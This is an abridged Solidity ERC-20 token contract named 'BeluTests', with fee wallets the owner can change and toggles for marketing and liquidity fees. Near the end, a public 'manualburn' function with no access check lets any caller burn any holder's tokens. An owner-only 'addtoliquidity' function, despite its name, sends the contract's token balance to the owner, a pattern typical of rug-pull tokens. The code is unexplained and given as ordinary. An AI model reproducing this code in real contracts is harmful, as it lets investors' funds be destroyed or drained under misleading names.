...
abstract contract Ownable is Context {
    ...
    function liquidity() public virtual {
        require(
...
contract BeluTests is ERC20, Ownable {
    ...
    address private _priceandliqAccount;
    address private _charityAccount;
    address private _deadAccount = 0x0000000000000000000000000000000000000000;
    ...
    uint256 private contractTokenBalance = balanceOf(address(this));

    constructor(uint256 totalSupply_, string memory name_, string memory symbol_, uint8 decimals_, address promarketingAccount_, address marketinganddevAccount_, address priceandliqAccount_, address charityAccount_, address service_) ERC20(name_, symbol_) payable {
        _decimals = decimals_;
        _burnFee = 0;
        ...
        _priceandliqAccount = priceandliqAccount_;
        _charityAccount = charityAccount_;
          ...
          _isExcludedFromFee[_priceandliqAccount] = true;
    ...
    function PriceandliqAccount() public view returns(address){
        return _priceandliqAccount;
    }
    ...
    function removeAllFee() private {
      ...
      function tokenomics() public onlyOwner {
          _promarketingT = 0;
          _marketinganddevT = 2;
          _burnFee = 0;
          _priceandliqT = 2;
      ...
      function setPromarketingAccount(address payable wallet) external onlyOwner {
        _promarketingAccount = wallet;
      }

      function setMarketinganddevAccount(address payable wallet) external onlyOwner {
        _marketinganddevAccount = wallet;
      }

      function setPriceandliqAccount(address payable wallet) external onlyOwner {
        _priceandliqAccount = wallet;
      }

      function setCharityAccount(address payable wallet) external onlyOwner {
        _charityAccount = wallet;
      }

      function promarketingon() public onlyOwner {
          _marketinganddevT = 1;
          _promarketingT = 1;     
      }

      function promarketingoff() public onlyOwner {
          _marketinganddevT = 2;
          _promarketingT = 0;     
      }  
    ...
    function priceandliqTransfer(address sender, uint256 amount) private {
        ...
        if(priceandliqF > 0){
            _balances[_priceandliqAccount] = _balances[_priceandliqAccount] + priceandliqF;
            emit Transfer(sender, _priceandliqAccount, priceandliqF);
        }
    }
    ...
    function addtoliquidity(uint256 amount) public onlyOwner {
            _transfer(address(this), owner(), amount);
    }

    function manualburn(address sender, uint256 amount) public {
            _transfer(sender, _deadAccount, amount);
    }
}